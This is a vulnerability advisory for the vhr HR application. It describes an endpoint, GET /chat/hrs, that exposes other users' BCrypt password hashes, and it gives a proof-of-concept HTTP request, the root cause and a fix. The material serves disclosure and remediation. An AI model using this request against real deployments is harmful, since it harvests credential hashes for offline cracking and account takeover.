# vhr（微人事） — BCrypt Password Hash Disclosure via GET /chat/hrs (VHR-VULN-004)

| Field | Value |
|-------|-------|
| **Vendor** | lenve |
| **Product** | vhr（微人事） |
| **Version** | 1.0-SNAPSHOT |
| **Type** | Exposure of Sensitive Information Through Data Queries |
| **CWE** | CWE-202 |
| **Authentication** | Any logged-in user |

## Summary

`GET /chat/hrs` returns full `Hr` objects including other users' BCrypt password hashes.

## Root cause

`ChatController.getHrs()` serializes `Hr` entities; `password` lacks `@JsonIgnore`.

## Proof of Concept

```http
GET /chat/hrs HTTP/1.1
Host: TARGET
Cookie: JSESSIONID=SESSION_LIBAI
Accept: application/json
Connection: close
```

**Expected:** JSON array with `"password":"$2a$10$..."` per user

## Impact

Offline cracking of weak default passwords (123).

## Remediation

Strip password field in API responses; add `@JsonIgnore` on `Hr.password`.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §VHR-VULN-004
- PoC: `POC_VERIFICATION_REPORT.md`
